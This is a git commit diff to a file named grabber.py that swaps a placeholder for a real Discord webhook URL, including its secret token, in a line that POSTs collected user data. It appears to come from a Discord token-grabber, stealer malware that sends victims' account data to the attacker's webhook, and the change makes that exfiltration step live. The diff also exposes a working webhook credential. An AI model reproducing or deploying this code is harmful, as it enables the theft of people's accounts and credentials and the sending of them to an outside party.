e815152f54af6b333f9c7f14142fe0ad1909a7ab
MintyDevSkibidi <mintyoftabor851@gmail.com>
2026-02-13 16:41:29 -0500

    Update grabber.py

--- grabber/grabber.py
+++ grabber/grabber.py
@@ -202,7 +202,7 @@ def main():
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
-                urllib.request.urlopen(urllib.request.Request('WEBHOOK_URL', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1471975927071379486/zVQKIngI_YtIObkJ-BRbqqJcn8kBt_Hf5BvflSiKq3aHNCNyCdxIzOgq2d-3JNDR2_yI', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
